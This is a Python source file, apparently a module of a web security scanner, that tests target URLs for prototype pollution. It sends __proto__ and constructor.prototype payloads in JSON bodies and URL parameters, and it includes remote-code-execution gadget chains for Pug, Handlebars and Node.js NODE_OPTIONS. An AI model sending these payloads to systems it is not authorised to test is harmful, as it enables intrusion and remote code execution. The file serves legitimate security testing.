"""C19 – Prototype pollution tester.

Tests server-side and client-side prototype pollution via JSON merge,
framework-specific payloads, canary-based detection, and RCE chain probes.
"""

from __future__ import annotations

import asyncio
import json
import random
import string
import time
from datetime import datetime
from typing import Any
from urllib.parse import urlparse, urlencode

import httpx

from app.modules.base_module import BaseModule

# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

# Standard __proto__ and constructor.prototype JSON pollution payloads
_PROTO_PAYLOADS: list[dict[str, Any]] = [
    {"__proto__": {"polluted": "canary_REPLACE"}},
    {"constructor": {"prototype": {"polluted": "canary_REPLACE"}}},
    {"__proto__": {"admin": True}},
    {"__proto__": {"isAdmin": True}},
    {"constructor": {"prototype": {"admin": True}}},
    {"__proto__": {"toString": "[object Object]"}},
    {"__proto__": {"valueOf": 1}},
]

# Framework-specific payloads
_FRAMEWORK_PAYLOADS: list[dict[str, Any]] = [
    # Express.js status code injection
    {"__proto__": {"status": 200}},
    {"constructor": {"prototype": {"statusCode": 200}}},
    # Lodash _.merge exploitation
    {"__proto__": {"enable_debug": True}},
    # jQuery $.extend deep merge
    {"__proto__": {"isEmptyObject": True}},
    # Pug template engine RCE gadget
    {"__proto__": {"block": {"callee": "process.mainModule.require('child_process').execSync"}}},
    # body-parser / qs pollution
    {"__proto__": {"content-type": "application/json"}},
    # flat library
    {"__proto__": {"__defineGetter__": "polluted"}},
]

# Node.js RCE chain via polluted environment
_RCE_CHAIN_PAYLOADS: list[dict[str, Any]] = [
    # child_process spawn env pollution
    {
        "__proto__": {
            "env": {"NODE_OPTIONS": "--require /proc/self/environ"},
            "shell": "bash",
        }
    },
    # vm module bypass
    {"__proto__": {"escapeMarkup": False}},
    # Handlebars RCE
    {
        "__proto__": {
            "pendingContent": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.env\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
        }
    },
]

# URL parameter-based client-side pollution probes
_URL_PARAM_PAYLOADS = [
    "__proto__[polluted]=canary_REPLACE",
    "constructor[prototype][polluted]=canary_REPLACE",
    "__proto__[admin]=true",
    "constructor.prototype.admin=true",
]

_FRAGMENT_PAYLOADS = [
    "#__proto__[polluted]=canary_REPLACE",
    "#constructor[prototype][polluted]=canary_REPLACE",
]


def _make_canary() -> str:
    """Generate a unique canary string for pollution detection."""
    return "pp_canary_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


# ---------------------------------------------------------------------------
# Module
# ---------------------------------------------------------------------------


class PrototypePollutionTester(BaseModule):
    """Tests for server-side and client-side prototype pollution vulnerabilities.

    Injects __proto__ and constructor.prototype payloads in JSON bodies,
    URL parameters, and uses canary-based detection to confirm pollution.
    """

    name = "prototype_pollution"
    description = (
        "Tests for prototype pollution via JSON __proto__, constructor.prototype, "
        "framework-specific gadgets, RCE chains, and URL parameter injection."
    )
    version = "1.0.0"
    category = "web_security"

    async def run(self, target: str, **kwargs) -> dict[str, Any]:
        """Run prototype pollution tests against *target*.

        Args:
            target: Base URL of the application under test.
            **kwargs:
                paths (list[str]): API endpoint paths to test (default: [/]).
                timeout (int): HTTP timeout (default: 10).
                concurrency (int): Max parallel requests (default: 10).
                test_rce_chains (bool): Also send RCE chain payloads (default: False).

        Returns:
            Dict with ``findings``, ``probe_results``, and metadata.
        """
        self.started_at = datetime.utcnow()
        base = _normalise_url(target)
        paths: list[str] = kwargs.get("paths", ["/"])
        timeout = int(kwargs.get("timeout", 10))
        concurrency = min(int(kwargs.get("concurrency", 10)), 30)
        test_rce: bool = bool(kwargs.get("test_rce_chains", False))

        probe_results: list[dict[str, Any]] = []
        sem = asyncio.Semaphore(concurrency)

        async with httpx.AsyncClient(
            timeout=timeout, verify=False, follow_redirects=True,
            limits=httpx.Limits(max_connections=concurrency, max_keepalive_connections=concurrency),
        ) as client:
            tasks: list[Any] = []
            for path in paths:
                url = base.rstrip("/") + path
                tasks.append(self._test_json_pollution(client, url, sem))
                tasks.append(self._test_framework_payloads(client, url, sem))
                tasks.append(self._test_url_params(client, url, sem))
                if test_rce:
                    tasks.append(self._test_rce_chains(client, url, sem))
            batch = await asyncio.gather(*tasks, return_exceptions=True)

        for result in batch:
            if isinstance(result, list):
                probe_results.extend(result)

        self.completed_at = datetime.utcnow()
        return {
            "module": self.name,
            "target": base,
            "findings": self.results,
            "probe_results": probe_results,
            "started_at": self.started_at.isoformat(),
            "completed_at": self.completed_at.isoformat(),
        }

    # ------------------------------------------------------------------ #
    # JSON body pollution                                                  #
    # ------------------------------------------------------------------ #

    async def _test_json_pollution(
        self,
        client: httpx.AsyncClient,
        url: str,
        sem: asyncio.Semaphore,
    ) -> list[dict[str, Any]]:
        """POST __proto__ and constructor.prototype payloads in JSON body."""
        results: list[dict[str, Any]] = []
        for payload_template in _PROTO_PAYLOADS:
            canary = _make_canary()
            payload = json.loads(
                json.dumps(payload_template).replace("canary_REPLACE", canary)
            )
            resp = await _safe_post_json(client, url, payload, sem)
            if resp is None:
                continue
            reflected, evidence = _check_canary(resp, canary)
            result = {
                "type": "json_proto_pollution",
                "url": url,
                "payload_keys": list(payload.keys()),
                "canary": canary,
                "canary_reflected": reflected,
                "status": resp.status_code,
            }
            results.append(result)
            if reflected:
                self.add_finding(
                    title="Prototype pollution canary reflected (JSON body)",
                    severity="high",
                    description=(
                        f"A canary value injected via '__proto__' or 'constructor.prototype' "
                        f"in a JSON POST body was reflected in the response from '{url}'. "
                        "This strongly indicates server-side prototype pollution."
                    ),
                    evidence=evidence,
                    url=url,
                    payload=str(payload)[:200],
                )

            # Also check for 500 errors that suggest RCE-gadget activation
            if resp.status_code == 500:
                self.add_finding(
                    title="Server error on prototype pollution payload",
                    severity="medium",
                    description=(
                        f"The server returned HTTP 500 when processing a prototype pollution "
                        f"payload at '{url}'. This may indicate the payload triggered an "
                        "internal error, suggesting a gadget chain exists."
                    ),
                    evidence=f"Payload keys: {list(payload.keys())}, Status: 500",
                    url=url,
                )
        return results

    # ------------------------------------------------------------------ #
    # Framework-specific payloads                                         #
    # ------------------------------------------------------------------ #

    async def _test_framework_payloads(
        self,
        client: httpx.AsyncClient,
        url: str,
        sem: asyncio.Semaphore,
    ) -> list[dict[str, Any]]:
        """Send framework-specific pollution payloads and analyse responses."""
        results: list[dict[str, Any]] = []
        for payload in _FRAMEWORK_PAYLOADS:
            resp = await _safe_post_json(client, url, payload, sem)
            if resp is None:
                continue
            result = {
                "type": "framework_pollution",
                "url": url,
                "payload_preview": str(payload)[:100],
                "status": resp.status_code,
            }
            results.append(result)
            # Detect Express.js status injection: server returns 200 for a request
            # that should normally 4xx
            if resp.status_code == 200 and "__proto__" in json.dumps(payload) and "status" in json.dumps(payload):
                self.add_finding(
                    title="Possible Express.js status code injection via prototype pollution",
                    severity="high",
                    description=(
                        f"Injecting __proto__.status=200 returned HTTP 200 from '{url}'. "
                        "This may indicate Express.js prototype pollution allowing status "
                        "code overriding."
                    ),
                    evidence=f"Status: {resp.status_code}",
                    url=url,
                )
        return results

    # ------------------------------------------------------------------ #
    # URL parameter pollution                                              #
    # ------------------------------------------------------------------ #

    async def _test_url_params(
        self,
        client: httpx.AsyncClient,
        url: str,
        sem: asyncio.Semaphore,
    ) -> list[dict[str, Any]]:
        """Test URL query parameter and fragment-based prototype pollution."""
        results: list[dict[str, Any]] = []
        for param_payload in _URL_PARAM_PAYLOADS:
            canary = _make_canary()
            full_payload = param_payload.replace("canary_REPLACE", canary)
            test_url = f"{url}?{full_payload}"
            try:
                async with sem:
                    resp = await client.get(test_url)
            except Exception:
                continue
            reflected, evidence = _check_canary(resp, canary)
            result = {
                "type": "url_param_pollution",
                "url": test_url,
                "canary": canary,
                "canary_reflected": reflected,
                "status": resp.status_code,
            }
            results.append(result)
            if reflected:
                self.add_finding(
                    title="Client-side prototype pollution via URL parameter",
                    severity="medium",
                    description=(
                        f"A canary value injected via URL parameter pollution "
                        f"('{full_payload[:80]}') was reflected in the response from "
                        f"'{url}'. This may enable client-side prototype pollution."
                    ),
                    evidence=evidence,
                    url=test_url,
                    payload=full_payload[:80],
                )
        return results

    # ------------------------------------------------------------------ #
    # RCE chain probes                                                     #
    # ------------------------------------------------------------------ #

    async def _test_rce_chains(
        self,
        client: httpx.AsyncClient,
        url: str,
        sem: asyncio.Semaphore,
    ) -> list[dict[str, Any]]:
        """Send RCE gadget chain payloads and look for command execution indicators."""
        results: list[dict[str, Any]] = []
        rce_indicators = [
            "root:", "daemon:", "bin/bash", "uid=", "gid=",  # command output
            "node", "npm", "package.json",                    # Node.js process info
        ]
        for payload in _RCE_CHAIN_PAYLOADS:
            resp = await _safe_post_json(client, url, payload, sem)
            if resp is None:
                continue
            text = ""
            try:
                text = resp.text.lower()
            except Exception:
                pass
            hit_indicators = [ind for ind in rce_indicators if ind.lower() in text]
            result = {
                "type": "rce_chain",
                "url": url,
                "payload_preview": str(payload)[:100],
                "status": resp.status_code,
                "rce_indicators": hit_indicators,
            }
            results.append(result)
            if hit_indicators:
                self.add_finding(
                    title="Possible RCE via prototype pollution gadget chain",
                    severity="critical",
                    description=(
                        f"RCE indicators ({hit_indicators}) were found in the response "
                        f"after sending a prototype pollution RCE chain payload to '{url}'. "
                        "This strongly suggests remote code execution."
                    ),
                    evidence=f"Indicators: {hit_indicators}\nSnippet: {text[:300]}",
                    url=url,
                )
        return results


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------


def _normalise_url(target: str) -> str:
    if not target.startswith(("http://", "https://")):
        return f"https://{target}"
    return target


async def _safe_post_json(
    client: httpx.AsyncClient,
    url: str,
    payload: dict[str, Any],
    sem: asyncio.Semaphore,
) -> httpx.Response | None:
    """POST *payload* as JSON, return None on error."""
    try:
        async with sem:
            return await client.post(
                url,
                content=json.dumps(payload),
                headers={"Content-Type": "application/json"},
            )
    except Exception:
        return None


def _check_canary(resp: httpx.Response, canary: str) -> tuple[bool, str]:
    """Return (was_reflected, evidence_snippet)."""
    text = ""
    try:
        text = resp.text
    except Exception:
        pass
    if canary in text:
        idx = text.index(canary)
        return True, text[max(0, idx - 50): idx + len(canary) + 50]
    return False, ""
